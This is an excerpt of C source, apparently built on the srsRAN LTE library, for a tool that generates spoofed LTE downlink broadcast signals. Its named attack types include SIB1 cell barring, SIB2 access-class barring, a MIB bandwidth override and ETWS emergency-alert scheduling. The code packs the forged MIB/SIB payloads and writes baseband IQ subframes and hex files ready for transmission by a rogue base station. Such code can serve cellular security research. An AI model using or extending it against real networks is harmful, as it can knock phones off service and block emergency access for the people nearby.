...
const AttackTypeInfo attack_types[ATTACK_TYPE_COUNT] = {
  ...
  {"sib1_etws_sched",      "SIB1 Scheduling for ETWS SIB10/SIB11 on subframe 1"},
...
const char* mib_phich_res_to_string(srsran_phich_r_t phich_res)
{
  switch (phich_res) {
...
void print_effective_mib_summary()
{
  uint32_t sfn_msb = (tti / 10) >> 2;
  uint32_t mib_nof_prb = (attack_type == SIB2_ACBARRING || attack_type == MIB_DLBAND) ? 6 : cell.nof_prb;
  char system_frame_number[9] = {};
  for (int i = 0; i < 8; ++i) {
    system_frame_number[i] = ((sfn_msb >> (7 - i)) & 0x1) ? '1' : '0';
  }
  printf("[mib-effective] dl-Bandwidth=%s phich-Duration=%s phich-Resource=%s systemFrameNumber=%s "
         "schedulingInfoSIB1-BR-r13=0 systemInfoUnchanged-BR-r15=false partEARFCN-17.spare=00 spare=0\n",
         mib_dl_bw_to_string(mib_nof_prb),
         cell.phich_length == SRSRAN_PHICH_EXT ? "extended" : "normal",
         mib_phich_res_to_string(cell.phich_resources),
         system_frame_number);
}

bool should_override_mib_dlband_for_sf0()
{
  return (attack_type == SIB2_ACBARRING || attack_type == MIB_DLBAND) && (tti % 10) == 0;
}

void build_effective_mib_payload(uint8_t bch_payload[SRSRAN_BCH_PAYLOAD_LEN])
{
  uint32_t sfn = tti / 10;
  srsran_cell_t mib_cell = enb_dl->cell;
  if (should_override_mib_dlband_for_sf0()) {
    mib_cell.nof_prb = 6;
  }
  srsran_pbch_mib_pack(&mib_cell, sfn, bch_payload);
}

void override_mib_dlband_for_sf0_if_needed()
{
  if (!should_override_mib_dlband_for_sf0()) {
    return;
  }
  ...
  uint32_t sfn = tti / 10;
  build_effective_mib_payload(bch_payload);
  srsran_pbch_encode(&enb_dl->pbch, bch_payload, enb_dl->sf_symbols, sfn % 4);
}

int save_current_subframe_signal(const char* path)
{
  ...
  uint32_t signal_length    = SRSRAN_SF_LEN_PRB(cell.nof_prb);
  uint32_t total_length     = signal_length + zero_padding_len * 2;

  cf_t* temp_buffer = srsran_vec_cf_malloc(total_length);
  if (temp_buffer == NULL) {
    fclose(out);
    perror("malloc");
    return -1;
  ...
  memcpy(temp_buffer, zero_buff, zero_padding_len * sizeof(cf_t));
  memcpy(temp_buffer + zero_padding_len, signal_buffer[0], signal_length * sizeof(cf_t));
  memcpy(temp_buffer + zero_padding_len + signal_length, zero_buff, zero_padding_len * sizeof(cf_t));

  fwrite(temp_buffer, total_length * sizeof(cf_t), 1, out);
  free(temp_buffer);
  fclose(out);
  return 0;
}

void cleanup_generator_resources()
{
...
int save_payload_hex_file(const char* path, const uint8_t* data, uint32_t len)
{
...
void usage(const char *prog) {
  ...
  printf("  SIB1 ETWS Schedule:     %s --type sib1_etws_sched\n", prog);
...
int main(int argc, char** argv) {
  ...
  if ((tti % 10) == 0) {
    print_effective_mib_summary();
  }
  if (attack_type != MIB_DLBAND) {
    print_payload_hex(payload[0], payload_len);
  }
  if (attack_type == MIB_DLBAND) {
    char mib_hex_path[512] = {};
    char mib_signal_path[512] = {};
    uint8_t bch_payload[SRSRAN_BCH_PAYLOAD_LEN] = {};
    build_effective_mib_payload(bch_payload);
    print_payload_hex(bch_payload, SRSRAN_BCH_PAYLOAD_LEN / 8);
    snprintf(mib_hex_path, sizeof(mib_hex_path), "%s/%s.hex", output_dir, attack_types[attack_type].name);
    if (save_payload_hex_file(mib_hex_path, bch_payload, SRSRAN_BCH_PAYLOAD_LEN / 8) != 0) {
      return -1;
    }
    ...
    override_mib_dlband_for_sf0_if_needed();
    srsran_enb_dl_gen_signal(enb_dl);

    snprintf(mib_signal_path, sizeof(mib_signal_path), "%s/%s_sf%d.fc32", output_dir, attack_types[attack_type].name, tti);
    if (save_current_subframe_signal(mib_signal_path) != 0) {
      return -1;
    }
    printf("[ok] generated %s\n", mib_signal_path);

    cleanup_generator_resources();
    return 0;
  }
  /*if (write_pcap) {
  ...
  if (save_current_subframe_signal(outputfile) != 0) {
    return -1;
  }
  printf("[ok] generated %s\n", outputfile);
...
void generate_message(uint8_t* payload[], uint32_t* payload_len, const char* prog){
  ...
  switch (attack_type) {
    ...
    case SIB1_CELLBARRING:
      rnti = SRSRAN_SIRNTI;
      tti = 5;
      print_generation_banner();
      gen_sib1_cellbarring(payload[0], sizeof(uint8_t) * 2048, payload_len);
      break;
